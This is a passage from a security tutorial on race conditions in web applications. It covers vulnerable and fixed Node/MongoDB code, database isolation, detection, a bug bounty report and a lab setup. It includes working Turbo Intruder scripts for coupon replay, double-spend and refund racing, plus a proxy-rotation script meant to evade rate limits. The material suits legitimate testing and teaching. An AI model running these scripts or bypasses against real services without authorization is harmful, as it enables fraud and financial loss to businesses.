    return res.status(400).json({ error: 'Already voted' });
  }

  // INSERT vote
  await Vote.create({
    user_id: req.userId,
    post_id: postId,
    direction
  });

  // Update post score
  const increment = direction === 'up' ? 1 : -1;
  await Post.findByIdAndUpdate(postId, { $inc: { score: increment } });

  res.json({ message: 'Vote recorded' });
});
```

**Attack:** Send 100 simultaneous upvote requests. All 100 read `existingVote == null`, all 100 insert a vote, post score increases by 100 instead of 1.

### Fixed Code

```javascript
// SECURE: Unique compound index + upsert
// First, create the unique index:
// db.votes.createIndex({ user_id: 1, post_id: 1 }, { unique: true })

app.post('/api/v1/posts/:postId/vote', authMiddleware, async (req, res) => {
  const { postId } = req.params;
  const { direction } = req.body;

  try {
    // Upsert: insert if not exists, reject if exists (via unique index)
    const result = await Vote.findOneAndUpdate(
      { user_id: req.userId, post_id: postId },
      {
        $setOnInsert: {
          user_id: req.userId,
          post_id: postId,
          direction,
          created_at: new Date()
        }
      },
      {
        upsert: true,
        new: true,
        rawResult: true // Get operation metadata
      }
    );

    // Check if this was an insert (new vote) or an update (existing vote)
    if (!result.lastErrorObject.updatedExisting) {
      // New vote -- update post score
      const increment = direction === 'up' ? 1 : -1;
      await Post.findByIdAndUpdate(postId, { $inc: { score: increment } });
      return res.json({ message: 'Vote recorded' });
    } else {
      return res.status(400).json({ error: 'Already voted' });
    }
  } catch (err) {
    if (err.code === 11000) {
      // Duplicate key error -- race condition caught by unique index
      return res.status(400).json({ error: 'Already voted' });
    }
    res.status(500).json({ error: 'Voting failed' });
  }
});
```

---

## 11. Database-Level Race Conditions

### The Root Cause

Application-level checks (read-check-update) are inherently vulnerable to race conditions because the database has no knowledge of the application's intent. The solution must involve the database: either through atomic operations, transactions with proper isolation, or database-level constraints.

### PostgreSQL Isolation Levels

```sql
-- READ COMMITTED (default): Each statement sees the latest committed data.
-- Two transactions can both read the same row and both update it.
-- VULNERABLE to TOCTOU.

-- REPEATABLE READ: Each transaction sees a snapshot from the start of the transaction.
-- Prevents dirty reads and non-repeatable reads.
-- Still vulnerable to write skew (two transactions both check a condition and
-- both write, but the combined result violates the invariant).

-- SERIALIZABLE: Full isolation. Transactions execute as if they ran one at a time.
-- Prevents all anomalies, including write skew.
-- Higher overhead -- can cause serialization failures that require retry.

-- Example: SERIALIZABLE isolation for critical financial operations
BEGIN TRANSACTION ISOLATION LEVEL SERIALIZABLE;

SELECT balance FROM accounts WHERE user_id = 123;
-- balance is 100

-- If another transaction is trying to deduct from the same account,
-- PostgreSQL will detect the conflict and abort one of them.
UPDATE accounts SET balance = balance - 100 WHERE user_id = 123;

COMMIT;
-- If a serialization failure occurs, the application must retry.
```

### MongoDB Transactions (v4.0+)

```javascript
// MongoDB multi-document transaction for atomic operations
const session = await mongoose.startSession();

try {
  session.startTransaction({
    readConcern: { level: 'snapshot' },  // Consistent snapshot
    writeConcern: { w: 'majority' },     // Durability guarantee
    readPreference: 'primary'            // Always read from primary
  });

  // All operations within this block see a consistent snapshot
  // and are committed atomically
  const sender = await User.findById(senderId).session(session);
  const recipient = await User.findById(recipientId).session(session);

  if (sender.balance < amount) {
    throw new Error('Insufficient balance');
  }

  sender.balance -= amount;
  recipient.balance += amount;

  await sender.save({ session });
  await recipient.save({ session });

  await session.commitTransaction();
} catch (error) {
  await session.abortTransaction();

  // Check for transient transaction errors (retry-safe)
  if (error.hasErrorLabel && error.hasErrorLabel('TransientTransactionError')) {
    // Safe to retry the entire transaction
    // Implement exponential backoff
  }
  throw error;
} finally {
  session.endSession();
}
```

### Database Constraints as the Last Line of Defense

```sql
-- PostgreSQL: CHECK constraint prevents negative balance
ALTER TABLE users ADD CONSTRAINT positive_balance CHECK (balance >= 0);

-- Now even if the application has a race condition,
-- the second deduction will fail at the database level:
-- ERROR: new row for relation "users" violates check constraint "positive_balance"

-- Unique constraint prevents duplicate votes
CREATE UNIQUE INDEX idx_unique_vote ON votes (user_id, post_id);

-- Unique constraint prevents duplicate coupon redemption
CREATE UNIQUE INDEX idx_unique_redemption ON coupon_redemptions (coupon_id, user_id);

-- Stock floor constraint
ALTER TABLE products ADD CONSTRAINT positive_stock CHECK (stock >= 0);
```

---

## 12. Express.js Comprehensive Race Condition Prevention Pattern

```javascript
// A reusable pattern for race-safe operations in Express.js + MongoDB

class AtomicOperation {
  constructor(maxRetries = 3) {
    this.maxRetries = maxRetries;
  }

  async execute(operation) {
    for (let attempt = 0; attempt < this.maxRetries; attempt++) {
      const session = await mongoose.startSession();
      try {
        session.startTransaction({
          readConcern: { level: 'snapshot' },
          writeConcern: { w: 'majority' }
        });

        const result = await operation(session);

        await session.commitTransaction();
        return result;
      } catch (error) {
        await session.abortTransaction();

        // Retry on transient errors
        if (
          error.hasErrorLabel?.('TransientTransactionError') ||
          error.code === 112 // WriteConflict
        ) {
          console.warn(`Transaction retry attempt ${attempt + 1}/${this.maxRetries}`);
          // Exponential backoff: 50ms, 100ms, 200ms
          await new Promise(resolve =>
            setTimeout(resolve, 50 * Math.pow(2, attempt))
          );
          continue;
        }

        throw error; // Non-transient error -- do not retry
      } finally {
        session.endSession();
      }
    }

    throw new Error('Transaction failed after maximum retries');
  }
}

// Usage
const atomicOp = new AtomicOperation(3);

app.post('/api/v1/wallet/transfer', authMiddleware, async (req, res) => {
  const { recipient_id, amount } = req.body;

  try {
    const result = await atomicOp.execute(async (session) => {
      const sender = await User.findById(req.userId).session(session);
      if (sender.balance < amount) {
        throw new Error('Insufficient balance');
      }

      sender.balance -= amount;
      await sender.save({ session });

      await User.findByIdAndUpdate(
        recipient_id,
        { $inc: { balance: amount } },
        { session }
      );

      await TransactionLog.create([{
        sender_id: req.userId,
        recipient_id,
        amount,
        type: 'transfer',
        created_at: new Date()
      }], { session });

      return { new_balance: sender.balance };
    });

    res.json({ message: 'Transfer complete', ...result });
  } catch (error) {
    if (error.message === 'Insufficient balance') {
      return res.status(400).json({ error: error.message });
    }
    res.status(500).json({ error: 'Transfer failed' });
  }
});
```

---

## 13. Turbo Intruder Scripts for Race Condition Testing

### Basic Race Condition Script

Turbo Intruder is a Burp Suite extension designed for sending HTTP requests at extreme speeds. It is the primary tool for race condition testing.

**Setup:** Install Turbo Intruder from BApp Store. Right-click a request in Repeater or Proxy and select "Send to Turbo Intruder."

### Script: Single-Request Race

```python
# Turbo Intruder: Send the same request N times simultaneously
# Use this for coupon replay, balance abuse, etc.

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=1,
                           pipeline=False)

    # Queue 50 identical requests
    for i in range(50):
        engine.queue(target.req, gate='race1')

    # Open the gate -- all 50 requests fire simultaneously
    engine.openGate('race1')

def handleResponse(req, interesting):
    # Log all responses
    if req.status == 200:
        table.add(req)
```

### Script: Multi-Endpoint Race

```python
# Turbo Intruder: Race between two different endpoints
# Example: Buy and refund simultaneously

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=1,
                           pipeline=False)

    # Purchase request
    purchase_req = '''POST /api/v1/orders/purchase HTTP/1.1\r
Host: api.target.com\r
Authorization: Bearer {token}\r
Content-Type: application/json\r
\r
{{"product_id": 1, "quantity": 1}}'''

    # Refund request (for a previously purchased order)
    refund_req = '''POST /api/v1/orders/6615a1b2/refund HTTP/1.1\r
Host: api.target.com\r
Authorization: Bearer {token}\r
Content-Type: application/json\r
\r
{{}}'''

    # Queue both types behind the same gate
    for i in range(25):
        engine.queue(purchase_req, gate='race1')
    for i in range(25):
        engine.queue(refund_req, gate='race1')

    # Fire all 50 requests at once
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Script: Coupon Replay with Response Analysis

```python
# Turbo Intruder: Coupon replay with success counting

successful_applications = []

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           requestsPerConnection=1,
                           pipeline=False)

    # The request body contains the coupon code
    # target.req should already contain the full request from Burp Repeater
    for i in range(100):
        engine.queue(target.req, gate='coupon_race')

    engine.openGate('coupon_race')

def handleResponse(req, interesting):
    # Check for successful coupon application
    if req.status == 200 and b'"message": "Coupon applied"' in req.response:
        successful_applications.append(req)
        table.add(req)

    # After all responses, check how many succeeded
    # If more than 1 succeeded, the race condition is confirmed
```

### Script: Account Balance Double-Spend

```python
# Turbo Intruder: Double-spend test for wallet transfer

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=1,
                           pipeline=True)  # Enable HTTP pipelining for tighter timing

    # Transfer request -- all going to different recipients
    # to avoid the "already transferred" check
    for i in range(50):
        # Modify the request body for each recipient
        modified_req = target.req.replace(
            b'"recipient_id": "PLACEHOLDER"',
            b'"recipient_id": "recipient_' + str(i).encode() + b'"'
        )
        engine.queue(modified_req, gate='double_spend')

    engine.openGate('double_spend')

def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)
    # Count how many 200s vs 400s to measure the race window
```

### Advanced: HTTP/2 Single-Packet Attack

HTTP/2 multiplexing allows sending multiple requests in a single TCP packet, achieving tighter timing than HTTP/1.1:

```python
# Turbo Intruder: HTTP/2 single-packet attack
# Requires the target to support HTTP/2

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.HTTP2)

    # All 100 requests will be multiplexed on a single HTTP/2 connection
    # and sent in a single TCP packet
    for i in range(100):
        engine.queue(target.req, gate='h2_race')

    engine.openGate('h2_race')

def handleResponse(req, interesting):
    table.add(req)
```

---

## 14. Burp Suite Repeater: Group Send in Parallel

Starting with Burp Suite 2023.9, the Repeater tab supports sending multiple requests in parallel -- a built-in race condition testing feature.

### Step-by-Step Workflow

**Step 1: Set up the request.**

1. Capture the vulnerable request in Proxy.
2. Send it to Repeater.

**Step 2: Create a tab group.**

1. In Repeater, click "+" to create 20 new tabs.
2. Paste the same request into each tab (or use Ctrl+D to duplicate).
3. Select all tabs, right-click, and choose "Create tab group."
4. Name it "Race Test."

**Step 3: Send in parallel.**

1. With the tab group selected, click the dropdown arrow next to "Send."
2. Select "Send group in parallel."
3. All 20 requests fire simultaneously.

**Step 4: Analyze results.**

1. Compare responses across all tabs.
2. Count how many returned 200 OK with success indicators.
3. If more than one succeeded for a single-use operation, the race condition is confirmed.

### Automating with Burp Macros

For race conditions that require authentication tokens or CSRF tokens:

1. Go to Project Options > Sessions > Session Handling Rules.
2. Create a new rule with a macro that extracts the CSRF token.
3. Set the rule to update the token before each request in the group.
4. This ensures each parallel request has a valid token.

---

## 15. Detection and Monitoring Strategies

### Application-Level Detection

```javascript
// Express.js: Middleware to detect potential race condition exploitation
const raceDetectionWindow = new Map(); // In production, use Redis

function detectRaceAttempt(operationType) {
  return (req, res, next) => {
    const key = `${req.userId}:${operationType}:${req.originalUrl}`;
    const now = Date.now();
    const windowMs = 1000; // 1 second window

    const recent = raceDetectionWindow.get(key) || [];
    const recentInWindow = recent.filter(ts => now - ts < windowMs);

    recentInWindow.push(now);
    raceDetectionWindow.set(key, recentInWindow);

    // If the same user hits the same endpoint more than 5 times within 1 second,
    // this is likely a race condition attempt
    if (recentInWindow.length > 5) {
      console.warn('[SECURITY] Potential race condition attempt', {
        user_id: req.userId,
        endpoint: req.originalUrl,
        requests_in_window: recentInWindow.length,
        ip: req.ip,
        timestamp: new Date().toISOString()
      });

      // Option 1: Block the request
      return res.status(429).json({
        error: 'Too many concurrent requests. Please try again.'
      });

      // Option 2: Allow but alert (to avoid breaking legitimate traffic)
      // next();
    }

    next();
  };
}

// Usage
app.post('/api/v1/orders/apply-coupon',
  authMiddleware,
  detectRaceAttempt('coupon_apply'),
  applyCouponHandler
);

app.post('/api/v1/wallet/transfer',
  authMiddleware,
  detectRaceAttempt('wallet_transfer'),
  transferHandler
);
```

### Database-Level Monitoring

```sql
-- PostgreSQL: Monitor for serialization failures (indicates race conditions are being prevented)
SELECT datname, deadlocks, conflicts
FROM pg_stat_database
WHERE datname = 'appdb';

-- Monitor lock waits
SELECT
    pid,
    now() - pg_stat_activity.query_start AS duration,
    query,
    state
FROM pg_stat_activity
WHERE (now() - pg_stat_activity.query_start) > interval '5 seconds'
AND state != 'idle'
ORDER BY duration DESC;

-- Deadlock detection
SELECT * FROM pg_locks WHERE NOT granted;
```

### Infrastructure-Level Monitoring

```yaml
# CloudWatch alarm for unusual request patterns
Resources:
  RaceConditionAlarm:
    Type: AWS::CloudWatch::Alarm
    Properties:
      AlarmName: race-condition-detection
      MetricName: ConcurrentDuplicateRequests
      Namespace: CustomMetrics/APISecurity
      Statistic: Sum
      Period: 60
      EvaluationPeriods: 1
      Threshold: 10
      ComparisonOperator: GreaterThanThreshold
      AlarmActions:
        - !Ref SecurityAlertSNSTopic
```

### Log Analysis for Race Conditions

```bash
# Search for multiple identical requests from same user within 1 second
# Assumes structured JSON logging

# Using jq to analyze application logs
cat app.log | jq -s '
  group_by(.user_id, .endpoint, (.timestamp | split(".")[0])) |
  map(select(length > 5)) |
  map({
    user_id: .[0].user_id,
    endpoint: .[0].endpoint,
    count: length,
    timestamp: .[0].timestamp
  })
'

# CloudWatch Logs Insights query
fields @timestamp, user_id, endpoint, status_code
| filter endpoint like /coupon|transfer|withdraw|refund|purchase/
| stats count(*) as request_count by user_id, endpoint, bin(1s) as time_window
| filter request_count > 5
| sort request_count desc
```

### Idempotency Keys

The most robust defense against race conditions from the client side is idempotency keys:

```javascript
// Express.js: Idempotency key middleware
const idempotencyStore = new Map(); // Use Redis in production

function requireIdempotencyKey(ttlMs = 3600000) { // 1 hour TTL
  return async (req, res, next) => {
    const key = req.headers['idempotency-key'];

    if (!key) {
      return res.status(400).json({
        error: 'Idempotency-Key header is required for this endpoint'
      });
    }

    // Check if we have already processed this key
    const existing = idempotencyStore.get(key);

    if (existing) {
      // Return the cached response -- prevents duplicate processing
      return res.status(existing.status).json(existing.body);
    }

    // Intercept the response to cache it
    const originalJson = res.json.bind(res);
    res.json = (body) => {
      idempotencyStore.set(key, {
        status: res.statusCode,
        body,
        timestamp: Date.now()
      });

      // Set TTL for cleanup
      setTimeout(() => idempotencyStore.delete(key), ttlMs);

      return originalJson(body);
    };

    next();
  };
}

// Usage
app.post('/api/v1/wallet/transfer',
  authMiddleware,
  requireIdempotencyKey(),
  transferHandler
);
```

**Client-side usage:**

```http
POST /api/v1/wallet/transfer HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json
Idempotency-Key: 550e8400-e29b-41d4-a716-446655440000

{
  "recipient_id": "507f1f77bcf86cd799439011",
  "amount": 100
}
```

Even if the client sends this request 50 times (deliberately or via retry), only the first execution processes the transfer. All subsequent requests return the cached result.

---

## 16. Bug Bounty Report Example

### Report: Race Condition in Coupon Redemption Allows Unlimited Discount Application

**Title:** Race Condition in POST /api/v1/orders/apply-coupon Allows Single-Use Coupon to Be Applied Multiple Times

**Severity:** High (CVSS 8.1)

**Affected Endpoint:** `POST /api/v1/orders/apply-coupon`

**Summary:**

The coupon redemption endpoint at `/api/v1/orders/apply-coupon` is vulnerable to a race condition that allows a single-use coupon to be applied multiple times when requests are sent concurrently. The server checks if the coupon has been used and then marks it as used in two separate, non-atomic database operations. By sending 50+ simultaneous requests, an attacker can apply the same single-use 50%-off coupon to multiple orders, resulting in unauthorized discounts.

**Steps to Reproduce:**

1. Create two user accounts and log in to obtain JWT tokens.
2. Create a valid 50%-off single-use coupon code: `SAVE50ONCE`.
3. Create an order with a total of $200.00.
4. Open Burp Suite and send the following request to Turbo Intruder:

```http
POST /api/v1/orders/apply-coupon HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json

{
  "order_id": "6615a1b2c3d4e5f6a7b8c9d0",
  "coupon_code": "SAVE50ONCE"
}
```

5. Use the following Turbo Intruder script:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=1,
                           pipeline=False)
    for i in range(50):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)
```

6. Observe that 8-12 of the 50 requests return HTTP 200 with `"message": "Coupon applied"`, each applying a $100.00 discount.
7. Verify in the database that the order now has a cumulative discount far exceeding the intended single application.

**Impact:**

- Financial loss: Each exploitation instance generates unauthorized discounts proportional to the coupon value multiplied by the number of successful race condition hits.
- At scale: An attacker could automate this against high-value coupons (percentage-based discounts on large orders) to generate significant financial losses.
- The vulnerability extends to any business logic that follows the check-then-act pattern: loyalty point redemption, gift card usage, promotional credit application.

**Remediation:**

1. Use atomic database operations: Replace the separate read-check-update sequence with a single `findOneAndUpdate` that includes the condition `used: false` in the query filter.
2. Implement database-level constraints: Add a unique index on `(coupon_id, order_id)` in the redemptions table to prevent duplicate entries at the database level.
3. Implement idempotency keys: Require an `Idempotency-Key` header for all financial operations.
4. Add race condition detection middleware that flags and blocks rapid duplicate requests from the same user.

**CVSS Vector:** `AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N` = 5.3 (Medium) to `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` = 8.1 (High) depending on the financial impact and ease of exploitation.

---

## 17. Severity Explanation

| Vulnerability | Typical Severity | CVSS Range | Justification |
|---|---|---|---|
| Coupon replay (single-use bypass) | Medium - High | 5.3 - 8.1 | Direct financial loss per coupon value |
| Wallet double-spend | Critical | 9.1 - 9.8 | Create money from nothing, unlimited financial impact |
| Refund abuse (race condition) | High - Critical | 7.5 - 9.1 | Unlimited refunds, direct revenue loss |
| Subscription bypass (JWT-based) | Medium | 5.3 - 6.5 | Unauthorized premium access, limited direct loss |
| Trial abuse (infinite trials) | Low - Medium | 3.1 - 5.3 | Revenue impact, but no data at risk |
| Withdrawal limit bypass | High - Critical | 7.5 - 9.1 | Bypass financial controls |
| Inventory oversell | Medium - High | 5.3 - 7.5 | Business disruption, financial loss from fulfillment |
| Voting manipulation | Low - Medium | 3.1 - 5.3 | Integrity impact, social engineering enabler |
| Database-level race condition | Varies | 5.3 - 9.8 | Depends on what data/operation is affected |

Severity escalates when:
- The financial impact per exploitation is high.
- The exploitation can be automated at scale.
- The race window is wide (easy to exploit reliably).
- The vulnerability chains with other flaws (e.g., race condition + IDOR).

---

## 18. Common Bypass Techniques

### Bypassing Application-Level Protections

**1. Distributed requests from multiple IP addresses:**
If the server rate-limits by IP, use multiple proxy chains or cloud functions to distribute the attack.

```python
# Send race condition requests through multiple proxies
import requests
from concurrent.futures import ThreadPoolExecutor

proxies_list = [
    {"http": "socks5://proxy1:1080"},
    {"http": "socks5://proxy2:1080"},
    {"http": "socks5://proxy3:1080"},
    # ... 50 proxies
]

def send_request(proxy):
    return requests.post(
        "https://api.target.com/api/v1/orders/apply-coupon",
        json={"order_id": "abc123", "coupon_code": "SAVE50"},
        headers={"Authorization": "Bearer eyJ..."},
        proxies=proxy,
        timeout=5
    )

with ThreadPoolExecutor(max_workers=50) as executor:
    results = list(executor.map(send_request, proxies_list))

successes = [r for r in results if r.status_code == 200]
print(f"Successful applications: {len(successes)}")
```

**2. Multiple accounts:**
If the server rate-limits per user, create multiple accounts and race them all applying the same coupon to different orders.

**3. Session-less endpoints:**
Some coupon/promotion endpoints do not require authentication. Race conditions on unauthenticated endpoints bypass any per-user detection.

**4. Timing manipulation:**
Send requests with deliberately large payloads or slow TLS handshakes to synchronize arrival at the application logic.

**5. HTTP/2 single-packet attack:**
As described in Section 13, HTTP/2 multiplexing can pack all race requests into a single TCP packet, arriving at the server simultaneously and bypassing network-level rate limiting.

---

## 19. Lab Setup Ideas

### Docker Compose Lab for Race Condition Practice

```yaml
# docker-compose.yml
version: '3.8'
services:
  vulnerable-api:
    build: ./vulnerable-api
    ports:
      - "3000:3000"
    environment:
      - MONGO_URI=mongodb://mongo:27017/racelab
      - JWT_SECRET=lab-secret-key
      - REDIS_URL=redis://redis:6379
    depends_on:
      - mongo
      - redis

  vulnerable-api-pg:
    build: ./vulnerable-api-fastapi
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=postgresql://user:password@postgres:5432/racelab
    depends_on:
      - postgres

  mongo:
    image: mongo:7
    ports:
      - "27017:27017"

  postgres:
    image: postgres:16
    environment:
      - POSTGRES_USER=user
      - POSTGRES_PASSWORD=password
      - POSTGRES_DB=racelab
    ports:
      - "5432:5432"

  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"

  # Load testing tool
  grafana:
    image: grafana/grafana
    ports:
      - "3001:3000"
    environment:
      - GF_SECURITY_ADMIN_PASSWORD=admin
```

### Race Condition Testing Script (Python)

```python
#!/usr/bin/env python3
"""Race condition testing harness for lab practice."""

import asyncio
import aiohttp
import json
import time
from dataclasses import dataclass

@dataclass
class RaceResult:
    status_code: int
    body: str
    elapsed_ms: float

async def send_request(session, url, headers, body, semaphore):
    """Send a single request and return the result."""
    async with semaphore:
        start = time.monotonic()
        async with session.post(url, json=body, headers=headers) as resp:
            response_body = await resp.text()
            elapsed = (time.monotonic() - start) * 1000
            return RaceResult(
                status_code=resp.status,
                body=response_body,
                elapsed_ms=round(elapsed, 2)
            )

async def race_test(url, headers, body, num_requests=50):
    """Send num_requests simultaneously and analyze results."""
    # Use a semaphore to hold all requests until they are all ready
    semaphore = asyncio.Semaphore(0)

    async with aiohttp.ClientSession() as session:
        # Create all tasks
        tasks = [
            send_request(session, url, headers, body, semaphore)
            for _ in range(num_requests)
        ]

        # Release all at once
        for _ in range(num_requests):
            semaphore.release()

        results = await asyncio.gather(*tasks, return_exceptions=True)

    # Analyze
    successes = [r for r in results if isinstance(r, RaceResult) and r.status_code == 200]
    failures = [r for r in results if isinstance(r, RaceResult) and r.status_code != 200]
    errors = [r for r in results if isinstance(r, Exception)]

    print(f"\n{'='*60}")
    print(f"Race Condition Test Results")
    print(f"{'='*60}")
    print(f"Total requests:  {num_requests}")
    print(f"Successful (200): {len(successes)}")
    print(f"Failed (non-200): {len(failures)}")
    print(f"Errors:          {len(errors)}")
    print(f"{'='*60}")

    if len(successes) > 1:
        print(f"\n[VULNERABLE] Race condition confirmed!")
        print(f"  {len(successes)} requests succeeded for a single-use operation.")
    else:
        print(f"\n[SECURE] Only {len(successes)} request(s) succeeded.")

    return results

if __name__ == "__main__":
    url = "http://localhost:3000/api/v1/orders/apply-coupon"
    headers = {"Authorization": "Bearer eyJ...", "Content-Type": "application/json"}
    body = {"order_id": "test_order_1", "coupon_code": "SAVE50"}

    asyncio.run(race_test(url, headers, body, num_requests=50))
```

### Existing Labs for Practice

- **PortSwigger Web Security Academy**: Has dedicated race condition labs with guided exploitation.
- **OWASP crAPI**: Contains intentional business logic flaws exploitable via race conditions.
- **RaceTheWeb**: A framework specifically for testing race conditions in web apps.
- **Custom lab**: The Docker Compose setup above gives you full control to experiment with different database engines, isolation levels, and locking strategies.

---

## 20. Conclusion

Race conditions and business logic vulnerabilities are the apex predators of the vulnerability ecosystem. They require no injection, no malformed input, and no exploit kit. They exploit the fundamental gap between checking a condition and acting on it -- a gap that exists in virtually every read-then-write operation that lacks proper concurrency control.

The critical insight is this: application-level checks are inherently insufficient for preventing race conditions. If your code reads a value, checks it in application memory, and then writes a new value, there is always a window where concurrent requests can pass the check. The fix must involve the data layer: atomic database operations, transactions with appropriate isolation levels, database-level constraints, and optimistic or pessimistic locking.

For bug bounty hunters and penetration testers, race conditions are high-value, low-competition targets. Most hunters do not test for them because they require specialized tooling and a different mindset. When you find a race condition on a financial endpoint -- wallet transfers, coupon redemption, refund processing -- the severity is almost always high or critical, and the business impact is immediate and measurable.

Master Turbo Intruder. Understand database isolation levels. Learn to recognize the read-check-update antipattern in source code. These skills will set you apart in every engagement.

---

## Call to Action

Build the Docker lab from this guide and run the Python race testing script against both the vulnerable and fixed endpoints. See the race condition succeed, then see the atomic fix stop it. That hands-on understanding is worth more than reading about it.

Next, examine your own application's financial endpoints. Search your codebase for the pattern: read a value, check it, then update it in separate operations. Every instance is a potential race condition. Replace them with atomic operations, add database constraints as a safety net, and implement idempotency keys for all state-changing endpoints.

Then take these techniques to your next bug bounty program. Start with coupon, wallet, and refund endpoints. Set up Turbo Intruder with 50 concurrent connections. Open the gate. Count the 200s. File the report.
